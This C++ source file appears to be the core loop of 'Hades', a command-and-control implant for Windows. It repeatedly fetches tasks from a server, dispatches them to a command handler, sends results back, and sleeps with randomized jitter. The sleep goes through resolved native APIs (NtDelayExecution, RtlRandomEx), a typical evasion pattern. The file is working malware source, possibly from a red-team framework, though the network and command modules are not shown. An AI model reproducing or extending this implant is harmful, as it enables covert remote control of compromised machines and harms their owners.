#include "hades.h"
#include "config.hpp"
#include "../cmds/cmds.hpp"
#include "../networkd/network.hpp"
#include <stdio.h>

void HadesSleep(UINT Sleep, UINT jitter);

BOOL RunHades() {


    if (!InitAgent()) {
        DEBUG_LOG("Failed Loading\n");
        return FALSE;
    }

    PBYTE buf = AllocMemory<BYTE>(BASE_BUFFER_SIZE);
    UINT capacity = BASE_BUFFER_SIZE;
    UINT finalSize = 0;
    while (TRUE) {
        g_ByteMgr->InitWrite();
        g_ByteMgr->Write4(MSG_TYPE_OUTPUT);

        if (!g_Network->GetTask(&buf, BASE_BUFFER_SIZE, &finalSize, &capacity)) {
            DEBUG_LOG("Failed!");
        }

        DEBUG_LOG("Capacity = %d\nFinal Size = %d\n", capacity, finalSize);

        if (finalSize > 0) {
            g_Commander->Dispatch(buf, finalSize, g_ByteMgr->OutData);
        }

        g_FileMgr->CheckTasks();

        if (g_ByteMgr->WriteIndex > 4) {
            g_Network->SendOutput(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
            DEBUG_LOG("Write Index: %u\n", g_ByteMgr->WriteIndex);
        }

        HadesSleep(hades->config->Sleep, hades->config->Jitter);
    }

}

void HadesSleep(UINT Sleep, UINT jitter) {
    UINT base = Sleep * 1000;
    UINT a = base;
    if (jitter > 0) {
        ULONG s = 0;
        hades->NtApis.RtlRandomEx(&s);
        UINT r = (base * jitter) / 100;
        a = base - r + (s % (2 * r + 1));
    }
    LARGE_INTEGER d;
    d.QuadPart = -((LONGLONG)a * 10000);
    hades->NtApis.NtDelayExecution(FALSE, &d);
}


Hades* hades = NULL;